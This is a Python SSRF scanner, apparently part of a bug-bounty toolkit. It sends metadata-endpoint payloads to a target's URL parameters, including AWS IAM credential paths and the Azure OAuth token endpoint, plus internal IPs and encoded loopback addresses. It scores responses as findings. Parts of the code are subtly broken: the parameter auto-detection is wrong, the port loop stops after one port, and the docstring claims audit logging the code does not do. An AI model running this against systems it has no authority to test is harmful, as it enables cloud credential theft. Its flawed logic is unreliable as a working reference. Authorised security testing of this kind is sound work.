"""tools/ssrf_scanner.py

SSRF (Server-Side Request Forgery) Scanner for Bug Bounty.

Purpose:
- Detect SSRF vulnerabilities in URL/path parameters
- Test with internal IP ranges, cloud metadata endpoints
- Blind SSRF detection via timing analysis
- Generate evidence-based findings with severity scoring

Safety:
- Only tests user-specified targets
- Respects rate limits
- Logs all attempts for audit
"""

from __future__ import annotations

import hashlib
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, urlunparse

import requests

logger = logging.getLogger("elengenix.ssrf")


# Cloud metadata endpoints — if these respond, SSRF is confirmed
METADATA_ENDPOINTS = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/user-data",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1.json",
    ],
}

# Internal IP ranges to test
INTERNAL_IPS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "172.16.0.1",
    "192.168.1.1",
    "169.254.169.254",
]

# Common SSRF parameter names
SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "redirect", "return",
    "next", "target", "rurl", "img", "image", "load",
    "src", "source", "fetch", "callback", "feed",
    "host", "domain", "site", "page", "reference",
    "share", "link", "proxy", "request", "query",
]


@dataclass
class SSRFTestResult:
    url: str
    param: str
    payload: str
    status_code: int
    response_time_ms: float
    body_snippet: str
    is_vulnerable: bool
    confidence: float
    evidence_type: str  # "metadata_response", "internal_response", "timing_diff", "status_diff"


class SSRFScanner:
    """SSRF vulnerability scanner with cloud metadata detection."""

    def __init__(self, base_url: str, timeout: int = 10, rate_limit_rps: float = 1.0):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.rate_limit_rps = max(0.1, float(rate_limit_rps))
        self._last_req_ts = 0.0
        self._baseline_time_ms: Optional[float] = None

    def _sleep_rate_limit(self) -> None:
        min_interval = 1.0 / self.rate_limit_rps
        now = time.time()
        dt = now - self._last_req_ts
        if dt < min_interval:
            time.sleep(min_interval - dt)
        self._last_req_ts = time.time()

    def _make_request(self, url: str, params: Dict[str, str] = None,
                      headers: Dict[str, str] = None) -> Tuple[int, str, float]:
        """Make HTTP request and return (status_code, body_snippet, response_time_ms)."""
        self._sleep_rate_limit()
        start = time.time()
        try:
            r = requests.get(url, params=params, headers=headers,
                             timeout=self.timeout, allow_redirects=False, verify=False)
            elapsed_ms = (time.time() - start) * 1000
            return r.status_code, r.text[:500], elapsed_ms
        except requests.exceptions.Timeout:
            elapsed_ms = (time.time() - start) * 1000
            return 0, "TIMEOUT", elapsed_ms
        except requests.exceptions.ConnectionError:
            elapsed_ms = (time.time() - start) * 1000
            return 0, "CONNECTION_ERROR", elapsed_ms
        except Exception as e:
            elapsed_ms = (time.time() - start) * 1000
            return 0, str(e)[:100], elapsed_ms

    def _establish_baseline(self, url: str, param: str) -> Tuple[int, float]:
        """Get baseline response for a benign request."""
        status, _, elapsed = self._make_request(url, params={param: "https://example.com"})
        self._baseline_time_ms = elapsed
        return status, elapsed

    def _detect_metadata_response(self, body: str) -> Optional[str]:
        """Check if response body contains cloud metadata indicators."""
        metadata_indicators = {
            "aws": ["ami-id", "instance-id", "iam", "security-credentials", "ami-launch-index"],
            "gcp": ["computeMetadata", "project-id", "numeric-project-id", "ssh-keys"],
            "azure": ["azenvironment", "location", "name", "vmId", "subscriptionId"],
            "digitalocean": ["droplet_id", "hostname", "public_ipv4"],
        }
        body_lower = body.lower()
        for provider, indicators in metadata_indicators.items():
            for indicator in indicators:
                if indicator.lower() in body_lower:
                    return provider
        return None

    def scan_url_param(self, url: str, param: str,
                       headers: Dict[str, str] = None) -> List[SSRFTestResult]:
        """Scan a single URL parameter for SSRF."""
        results = []
        parsed = urlparse(url)

        if not self._baseline_time_ms:
            baseline_status, baseline_time = self._establish_baseline(url, param)
        else:
            baseline_status = 200
            baseline_time = self._baseline_time_ms

        # Test 1: Cloud metadata endpoints
        for provider, endpoints in METADATA_ENDPOINTS.items():
            for endpoint in endpoints[:2]:
                status, body, elapsed = self._make_request(
                    url, params={param: endpoint}, headers=headers
                )

                is_vuln = False
                confidence = 0.0
                evidence_type = ""

                cloud_provider = self._detect_metadata_response(body)
                if cloud_provider:
                    is_vuln = True
                    confidence = 0.95
                    evidence_type = "metadata_response"
                elif status == 200 and status != baseline_status:
                    is_vuln = True
                    confidence = 0.7
                    evidence_type = "status_diff"
                elif elapsed > 0 and baseline_time > 0 and elapsed > baseline_time * 2.5:
                    is_vuln = True
                    confidence = 0.5
                    evidence_type = "timing_diff"

                if is_vuln:
                    results.append(SSRFTestResult(
                        url=url, param=param, payload=endpoint,
                        status_code=status, response_time_ms=elapsed,
                        body_snippet=body[:200], is_vulnerable=True,
                        confidence=confidence, evidence_type=evidence_type,
                    ))

        # Test 2: Internal IPs with common ports
        for ip in INTERNAL_IPS[:4]:
            for port in [80, 443, 8080, 22]:
                payload = f"http://{ip}:{port}/"
                status, body, elapsed = self._make_request(
                    url, params={param: payload}, headers=headers
                )

                is_vuln = False
                confidence = 0.0
                evidence_type = ""

                if status == 200 and status != baseline_status:
                    is_vuln = True
                    confidence = 0.65
                    evidence_type = "internal_response"
                elif status == 0 and body == "TIMEOUT" and baseline_time > 0:
                    pass  # Timeout on internal may just mean no service
                elif elapsed > 0 and baseline_time > 0 and elapsed > baseline_time * 3:
                    is_vuln = True
                    confidence = 0.4
                    evidence_type = "timing_diff"

                if is_vuln:
                    results.append(SSRFTestResult(
                        url=url, param=param, payload=payload,
                        status_code=status, response_time_ms=elapsed,
                        body_snippet=body[:200], is_vulnerable=True,
                        confidence=confidence, evidence_type=evidence_type,
                    ))
                break  # Only test first port per IP to save time

        # Test 3: DNS rebinding style payloads
        dns_payloads = [
            "http://127.0.0.1:22/",
            "http://[::1]:80/",
            "http://0x7f000001/",
            "http://2130706433/",
            "http://0177.0.0.1/",
        ]
        for payload in dns_payloads:
            status, body, elapsed = self._make_request(
                url, params={param: payload}, headers=headers
            )
            if status == 200 and status != baseline_status:
                results.append(SSRFTestResult(
                    url=url, param=param, payload=payload,
                    status_code=status, response_time_ms=elapsed,
                    body_snippet=body[:200], is_vulnerable=True,
                    confidence=0.6, evidence_type="internal_response",
                ))

        return results

    def scan(self, url: str = None, params: List[str] = None,
             headers: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """
        Full SSRF scan on a URL.

        Args:
            url: Target URL (defaults to self.base_url)
            params: Specific parameter names to test (auto-detected if None)
            headers: Additional HTTP headers

        Returns:
            List of finding dicts
        """
        target_url = url or self.base_url
        findings = []

        if params is None:
            parsed = urlparse(target_url)
            existing_params = [k for k, _ in parsed.query.split("&") if "=" in _] if parsed.query else []
            params = existing_params if existing_params else SSRF_PARAM_NAMES[:8]

        for param in params:
            test_url = target_url
            results = self.scan_url_param(test_url, param, headers=headers)

            for r in results:
                if not r.is_vulnerable:
                    continue

                severity = "critical" if r.evidence_type == "metadata_response" else "high"
                if r.confidence < 0.5:
                    severity = "medium"

                findings.append({
                    "type": "ssrf",
                    "severity": severity,
                    "confidence": round(r.confidence, 2),
                    "title": f"SSRF via parameter '{r.param}'",
                    "target": target_url,
                    "description": (
                        f"SSRF vulnerability detected in parameter '{r.param}'.\n"
                        f"Payload: {r.payload}\n"
                        f"Evidence type: {r.evidence_type}\n"
                        f"Status: {r.status_code} | Response time: {r.response_time_ms:.0f}ms\n"
                        f"Response snippet: {r.body_snippet[:100]}"
                    ),
                    "source": "ssrf_scanner",
                    "url": target_url,
                    "param": r.param,
                    "payload": r.payload,
                    "evidence_type": r.evidence_type,
                })

        if not findings:
            logger.info(f"No SSRF vulnerabilities detected on {target_url}")

        return findings
